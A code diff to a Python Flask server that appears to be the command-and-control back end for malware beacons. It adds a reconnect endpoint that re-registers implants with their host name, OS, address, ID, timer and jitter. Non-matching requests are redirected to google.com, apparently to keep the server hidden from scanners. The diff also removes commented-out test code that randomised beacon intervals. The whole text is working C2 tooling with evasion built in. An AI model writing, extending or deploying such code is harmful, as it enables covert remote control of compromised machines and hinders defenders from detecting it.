@@ -20,7 +20,23 @@ def connection():
         add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
         return {"timer": 5, "uuid": userID, "jitter": 10}, 200
     else:
+        return Flask.redirect("https://www.google.com", code=302)   
+    
+@app.route('/reconect', methods=['GET'])
+def reconect():
+    name = request.args.get('name')
+    os = request.args.get('os')
+    address = request.args.get('address')
+    ID = request.args.get('id')
+    timer = request.args.get('timer')
+    jitter = request.args.get('jitter')
+    
+    if name and os and address and ID and timer and jitter:
+        add_beacon_list(ID, address, name, os, time.asctime(), float(timer), float(jitter))
+        return {"timer": 5, "uuid": ID, "jitter": 10}, 200
+    else:
         return Flask.redirect("https://www.google.com", code=302)
+    
 
 @app.route('/beacon', methods=['GET'])
 def beacon():
@@ -34,11 +50,6 @@ def beacon():
         if beacon_id == id:
             beacons["last_beacon"][i] = time.asctime()
             timer = beacons["timer"][i]
-            # POC to make sure this works
-            # if random.randint(0, 1):
-            #     timer = random.randint(5, 25)
-            #     beacons["timer"][i] = timer
-            #     data["timer"] = timer
             next_beacon_time = time.time() + timer
             beacons["next_beacon"][i] = time.asctime(time.localtime(next_beacon_time))
 
@@ -73,3 +84,4 @@ def response():
     if not found:
         return '', 500
     return '', 200
+
